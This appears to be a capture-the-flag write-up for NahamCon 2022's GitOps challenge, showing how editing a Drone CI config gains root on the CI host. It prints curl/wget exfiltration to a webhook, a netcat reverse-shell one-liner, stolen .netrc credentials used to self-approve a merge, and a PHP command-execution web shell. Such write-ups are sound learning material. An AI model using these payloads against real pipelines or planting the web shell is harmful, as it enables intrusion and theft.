---
title: NahamCon CTF 2022 – GitOps
date: '2022-05-02'
draft: false
authors: ['TheButcher']
tags: ['NahamCon CTF 2022', 'Misc', 'DevOps', 'Git', 'Pipeline', 'Gitea', 'DroneCI']
summary: 'Abuse the pipeline execution process to gain access to the host.'
---

# GitOps

> Challenge Author: @congon4tor#2334
>
> Someone leaked their git credentials (`developer:2!W4S5J$6e`). How deep can you infiltrate?
>
> This challenge uses vhosts.  
> Visit git.challenge.nahamcon.com:[YOUR_PORT]  
> Visit drone.challenge.nahamcon.com:[YOUR_PORT]  
> Visit web.challenge.nahamcon.com:[YOUR_PORT]

## Challenge Summary

In this challenge, we are given 3 different services to attack. There is an automated process that pushes the Master Branch of the Git Repository to the main webserver of the organisation. To complete this challenge, we will need to create a new commit with a modified DroneCI configuration file to abuse the pipeline execution process to gain access to the host running DroneCI and Gitea. Once on that host, we can find some credentials for another user allowed to review codes written by peers. With these information, we can inject malicious code in `index.php` by creating a new commit with the developer account and use the DroneCI account to approve and merge the malicious commit on the Master Branch. Our malicious Master Branch will then be pushed to the WebServer, and we are now able to gain code execution and grab the flag.

## Initial Reconnaissance

- `Git.challenge.nahamcon.com`

  - We can confirm that the application version with the page footer: _Powered by Gitea Version: 1.16.0_

  - We have valid credentials given by the challenge creator `developer:2!W4S5J$6e`

  - Once loggedIn, we have access to only 1 private repository, there is no public one, and we cannot create a new one _(Limit set to 0)_

  ![Web Repository main page](/static/images/nahamcon-ctf-2022/gitops/repository.png)
  ![ReadMe Screenshot](/static/images/nahamcon-ctf-2022/gitops/readme.png)

- `Drone.challenge.nahamcon.com`

  After some quick research, we can understand that drone is the application that automates the process to keep the webserver up to date.

  > Drone by Harness™ is a modern Continuous Integration platform that empowers busy teams to automate their build, test and release workflows using a powerful, cloud native pipeline engine. *https://docs.drone.io/*

  - Navigating the docs, we found an interesting feature, [**Exec Pipeline**](https://docs.drone.io/pipeline/exec/overview/).

   > An exec pipeline executes shell commands directly on the host machine without isolation. This is useful for workloads that need to run on the host, or are poorly suited for execution inside containers.

  - The `Drone.yml` file in the web repository is probably the drone config file. And from the `README.md` we can assume it gets run when we make a pull request to ensure our new code passes all the required checks.

- `Web.challenge.nahamcon.com`

  - This is the webserver, in the `ReadMe.md` from the Web repository, we learned that every minute, the GitOps system will push the `master` branch to this server.

    > Our gitops system will pull your changes every minute and update the website automatically.

  - We can assume this is the server containing the flag.

## Testing for Remote Code Execution

In our initial test, we tried to contact a webhook from https://webhook.site/. We added the following code to `drone.yml`.

```yaml
# ...
      - curl https://webhook.site/2289b2a6-580c-4091-90a4-4356e97c6fc0/$(whoami)
      - wget https://webhook.site/2289b2a6-580c-4091-90a4-4356e97c6fc0/$(whoami)
```

![Initial Testing](/static/images/nahamcon-ctf-2022/gitops/drone_whoami.png)

**Note:** We inserted a request with `curl` and with `wget` in case one of them is not installed on the system.

We can now check our webhook to see if the commands were successfully executed, and we can see two new requests, one with `curl` and one with `wget`. It worked, and we even have root privileges over the target machine!

![Webhook.site Result](/static/images/nahamcon-ctf-2022/gitops/webhook_whoami.png)

## Bonus: How to get command output without webhook

In this challenge, the target machine is connected to internet, but what if it was only accessible within the local network, or if it had a very strict firewall policy and you can’t exfiltrate data via the WAN network ?

This is where the drone application can help us, when we access the Drone web UI, we can see the result of our command in the output log.

![DroneCI output for initial testing](/static/images/nahamcon-ctf-2022/gitops/output_whoami.png)

We could do all our enumeration processes and root the target box this way, but it would be quite repetitive to create a new commit for each command then go to DroneCI to check the output...

## Getting Reverse shell

We will reproduce the same steps as the `whoami` command execution, but instead, we used some simple commands to gather more information about the target system.

```yaml
steps:
  - name: linting
    commands:
      - phplint --lint .
      - uname -a
      - cat /etc/issue
      - find $(echo $PATH | sed 's/:/ /g')
      - find / -perm /o+w -type d
```

### Stripped output Response

We only keep the most relevant data, to keep this list smaller but we had every binary on the default Environment Path

```
+ uname -a
Linux gitops-5edbd6bd8fd79ba1-c77694485-8gjlx 5.4.144+ #1 SMP Wed Nov 3 09:56:10 PDT 2021 x86_64 Linux

+ cat /etc/issue
Welcome to Alpine Linux 3.15
Kernel \r on an \m (\l)

+ find $(echo $PATH | sed 's/:/ /g')
/usr/local/bin/php
/usr/bin/wget
/usr/bin/nc
/usr/bin/whoami
/usr/bin/mkfifo
/usr/bin/git
/usr/bin/git-receive-pack
/usr/bin/git-upload-pack
/usr/bin/git-upload-archive
/usr/bin/git-shell
/usr/bin/curl
/bin/sh
/bin/base64
/bin/mktemp
/bin/ash
/bin/busybox

+ find / -perm /o+w -type d
/var/tmp
/var/www/html
/dev/shm
/tmp
```

### Key Points

- We do not have `bash` but we have access to `ash` and `sh`

- We can write in the `/tmp` folder

- No `python`, but `Perl` and `nc` are present

- Running Alpine Linux 3.15, which is a based on busybox, so limited commands

- x86_64 Linux If we would like to compile executable for the target

- We could use the Git CLI from this box to interact with the Repo instead of the Web UI

### Generating the payload

With these information, there are multiple ways of gaining a remote shell on the target computer, we choose the following payload for this challenge, repeat the previous steps and include it in `drone.yml`

```
mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc x.x.x.x 80 >/tmp/f
```

Start a listener on the selected port and catch the reverse shell with `nc -lnvp 80`

```shell
$ nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.0.181] from (UNKNOWN) [192.168.0.149] 51978
/bin/ash: can't access tty; job control turned off
/tmp/drone-u2aFxfYSGZ02aua6/done/src # whoami && id && ip a
root
uid=0(root) gid=0(root) groups=1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
        valid_lft forever preferred_lft forever
2: eth0@if2010: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1040 qdisc noqueue state UP 
    link/ether ea:9c:38:bf:2f:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.112.9.241/32 brd 10.112.9.241 scope global eth0
        valid_lft forever preferred_lft forever
/tmp/drone-u2aFxfYSGZ02aua6/done/src #
```

## Post Exploitation

Looking around the system, we found a really interesting file in the _Docker DroneCi Home folder_ named `.netrc`, we took a look inside, we had credentials for another user. We tried them against the Gitea application and successfully logged in as _DroneCI_:

```
/tmp/drone-u2aFxfYSGZ02aua6/home/drone # cat .netrc
machine git.challenge.nahamcon.com login droneci password t4K0@s!qSF
/tmp/drone-u2aFxfYSGZ02aua6/home/drone #
```

## Pivoting to Web Server

Remember in the `README.md`, we had to get someone else to approve our code before it gets merged into the Master Branch. We will use our newly discovered account to approve our malicious commit.

We will add a simple command execution form in the `index.php` file, and I always like to put a `phpinfo();`, This ways, if per example `system()` command is disabled on the server, with the `phpinfo`, I will be able to confirm I can execute PHP code, and you should be able to view which functions are restricted and tons of useful information on the target.

```php
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
  <input type="TEXT" name="cmd" id="cmd" size="80" />
  <input type="SUBMIT" value="Execute" />
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
<pre>
<?php
    phpinfo();
?>
</pre>
```

- Repeat previous steps to modify `drone.yml` but instead change `index.php`, Once the commit is made, you need to ask for a pull request

  ![Create Pull Request](/static/images/nahamcon-ctf-2022/gitops/PullRequest.png)

- Then Disconnect from the _developer_ account and connect with the credentials founds previously `droneci:t4K0@s!qSF`

- We now need to peer review the commit from _developer_ account asking to be merged into master

  ![Approve Commit made by Developer](/static/images/nahamcon-ctf-2022/gitops/peer_review.png)

- Now the final step, we need to actually create a merge commit to the master branch

  ![Merged to master branch](/static/images/nahamcon-ctf-2022/gitops/Merge.png)

### Confirm the malicious `index.php` has been pushed to the webserver

Now is the final check, Cross your fingers and navigate to `Web.challenge.nahamcon.com`.

![Reverse Shell Testing](/static/images/nahamcon-ctf-2022/gitops/phpinfo.png)

At first, we thought me might need to find some privilege escalation vulnerability on the web server to gain root access then grab the flag, we create a reverse shell from the Webserver, but after quick enumeration, we found the flag on the system root and were able to read it with user `www-data`. So instead of creating a new reverse shell, you can use `find` and `cat` to grab the flag.

```
find / -name *.txt -type f
cat /flag.txt
```

![Finding the flag](/static/images/nahamcon-ctf-2022/gitops/find_flag.png)
![Grabbing the Flag](/static/images/nahamcon-ctf-2022/gitops/flag.png)
